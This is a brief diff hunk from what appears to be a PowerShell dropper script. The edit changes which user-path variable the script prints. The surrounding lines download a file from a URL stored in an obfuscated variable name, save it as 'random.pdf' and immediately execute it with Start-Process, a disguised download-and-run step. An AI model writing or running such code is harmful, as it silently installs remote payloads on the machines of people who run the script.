@@ -43,7 +43,7 @@ finally {
 
 
     $path = ".\random.pdf"
-    Write-Output $env:USERPROFILE
+    Write-Output $env:HOMEPATH
     (New-Object System.Net.WebClient).DownloadFile($lwoxheihwic, $path)
     Start-Process -F $path
 
